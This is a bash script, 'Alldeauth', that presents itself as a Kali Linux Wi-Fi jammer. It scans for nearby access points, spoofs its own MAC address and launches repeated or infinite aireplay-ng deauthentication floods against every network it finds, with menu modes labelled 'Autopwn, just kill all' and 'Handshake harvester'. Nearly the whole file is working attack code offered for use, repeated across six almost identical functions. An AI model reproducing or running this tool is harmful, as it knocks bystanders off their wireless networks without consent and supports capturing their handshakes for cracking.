#!/bin/bash

#####################################################################################################################
#                                                                                                                   #
#                     This script is written by Pierre Goude                               #
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public #
#                 The author bears no responsibility  for malicious or illegal use.                                 #
#                                                                                                                   #
#                                                                                                                   #
#####################################################################################################################

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #
    NORMAL=`echo "\033[m"`
    MENU=`echo "\033[36m"` #Blue
    NUMBER=`echo "\033[33m"` #yellow
    FGRED=`echo "\033[41m"`
    RED_TEXT=`echo "\033[31m"` #Red
    ENTER_LINE=`echo "\033[33m"`
    INTRO_TEXT=`echo "\033[32m"` #green and white text
    INFOS=`echo "\033[103;30m"` #yellow bg
    SUCCESS=`echo "\033[102;30m"` #green bg
    WARNING=`echo "\033[101;30m"` #red bg
    WARP=`echo "\033[106;30m"` #lightblue bg
    BLACK=`echo "\033[109;30m"` #SPACE bg
    END=`echo "\033[0m"`

    
    
autocheck_fn()
{
if airmon-ng | grep mon0 &>/dev/null
then autopwn0
fi
  if airmon-ng | grep mon1 &>/dev/null
then autopwn1
  fi
    if airmon-ng | grep mon2 &>/dev/null
then autopwn2
    fi
      if airmon-ng | grep wlan0 &>/dev/null
then airmon-ng start wlan0
     autocheck_fn
      fi
        if airmon-ng | grep wlan1 &>/dev/null
then airmon-ng start wlan0
     autocheck_fn
        fi
          if airmon-ng | grep wlan1 &>/dev/null
then airmon-ng start wlan0
     autocheck_fn
          fi
}
autocheck1_fn()
{
if airmon-ng | grep mon0 &>/dev/null
then onthego
fi
  if airmon-ng | grep mon1 &>/dev/null
then onthego1
  fi
    if airmon-ng | grep mon2 &>/dev/null
then onthego2
    fi
      if airmon-ng | grep wlan0 &>/dev/null
then airmon-ng start wlan0
     autocheck1_fn
      fi
        if airmon-ng | grep wlan1 &>/dev/null
then airmon-ng start wlan0
     autocheck1_fn
        fi
          if airmon-ng | grep wlan1 &>/dev/null
then airmon-ng start wlan0
     autocheck1_fn
          fi
}
  
onthego()
{
Mon=mon0

DEAUTHS="15" #Number of DeAuths to Send, 0 = Infinate
waitTime="3" #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."


if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}  


onthego1()
{
Mon=mon1

DEAUTHS="15" #Number of DeAuths to Send, 0 = Infinate
waitTime="3" #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."


if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}  

onthego2()
{
Mon=mon2

DEAUTHS="15" #Number of DeAuths to Send, 0 = Infinate
waitTime="3" #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."


if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}  
    
autopwn0()
{

Mon=mon0

DEAUTHS="0" #Number of DeAuths to Send, 0 = Infinate
waitTime="50000" #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."


if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}  
autopwn1()
{

Mon=mon1

DEAUTHS="0" #Number of DeAuths to Send, 0 = Infinate
waitTime="50000" #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."


if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}  
autopwn2()
{

Mon=mon2

DEAUTHS="0" #Number of DeAuths to Send, 0 = Infinate
waitTime="50000" #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."


if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}    
  
sensitive_fn()
{
if airmon-ng | grep mon
then echo -e "${MENU}Monitor mode already enabled, type in desired mon to use${NORMAL}"	
read Mon
else
echo -e "${MENU}Printing Wireless cards...${NORMAL}"
airmon-ng | grep wlan
echo -e "${MENU}Please type in witch wlan interface you wish to use${NORMAL}"
read Wifi
echo -e "${MENU}Starting monitor mode${NORMAL}"
airmon-ng start $Wifi
echo -e "${MENU}please type in witch mon interface you wish to use${NORMAL}"
read Mon
fi 
echo -e "${MENU}Type how Number of DeAuths to Send 0 = Infinate${NORMAL}"
read deaths
echo -e "${MENU}Type how long time to wait before refresh scan data (seconds)${NORMAL}"
read w8time

DEAUTHS=$deaths #Number of DeAuths to Send, 0 = Infinate
waitTime=$w8time #Time to wait before refresh scan data.
FONINT="eth0"  # Our fakeAP interface
ourAPmac="00:12:CF:A4:92:B1"  #MAC



atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."

trap 'cleanup' 2 
function cleanup() {
	break
	xterm -geometry 75x12+464+288 -bg black -fg green -T "Mass DeAuth by Linoge - Killing DeAuths.." -e "killall -9 aireplay-ng"
	exit 0
}

if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`

xterm -geometry 75x12+464+288 -bg black -fg green -T "Linoge - Start $Wifi" -e "ifconfig $Wifi up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "Linoge - Start $Mon" -e "airmon-ng start $Wifi"
	moncheck=`ifconfig | grep $Mon | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth Linoge - Changing MAC Address of $Mon" -e "ifconfig $Mon down && macchanger -A $Mon && ifconfig $Mon up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	

	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 


	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	

	iwlist $Wifi scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	

	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."

       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
}	
    
    
    
    
    
    
    
#####################################Menu#######################################################
show_menu(){
    echo -e "${INTRO_TEXT}               Alldeauth is a deauthecation tool                    ${INTRO_TEXT}"
    echo -e "${INTRO_TEXT}          created for Kali linux by Pierre from Webbhatt            ${INTRO_TEXT}"
    echo -e "${NORMAL}                                                                        ${NORMAL}"
    echo -e "${MENU}***************************Alldeauth*By*Webbhatt**************************${NORMAL}"
    echo -e "${NORMAL}                                                                        ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 1)${MENU} Autopwn, just kill all infinitive                    ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 2)${MENU} Handshake harvester, Scan for new devices on the go  ${NORMAL}"
    echo -e "${MENU}*${NUMBER} 3)${MENU} Sensitive, i want to choose my settings and devices  ${NORMAL}"
    echo -e "${NORMAL}                                                                        ${NORMAL}"
    echo -e "${MENU}***************************Alldeauth*By*Webbhatt**************************${NORMAL}"
    echo -e "${ENTER_LINE}Please enter a menu option and enter or ${RED_TEXT}enter to exit.   ${NORMAL}"
    read opt
}
function option_picked() {
    COLOR='\033[01;31m' # bold red
    RESET='\033[00;00m' # normal white
    MESSAGE=${@:-"${RESET}Error: No message passed"}
    echo -e "${COLOR}${MESSAGE}${RESET}"
}
show_menu
while [ opt != '' ]
    do
    if [[ $opt = "" ]]; then 
            exit;
    else
        case $opt in
        1) clear;
        option_picked "Will now start Wifi jammer";
        autocheck_fn;
        ;;

        2) clear;
            option_picked "Killer on the go";
            autocheck1_fn;
            ;;

        3) clear;
            option_picked "Selecting devices";
            sensitive_fn;
            ;;

        x)exit;
        ;;

        \n)exit;
        ;;

        *)clear;
        option_picked "Pick an option from the menu";
        show_menu;
        ;;
    esac
fi
done





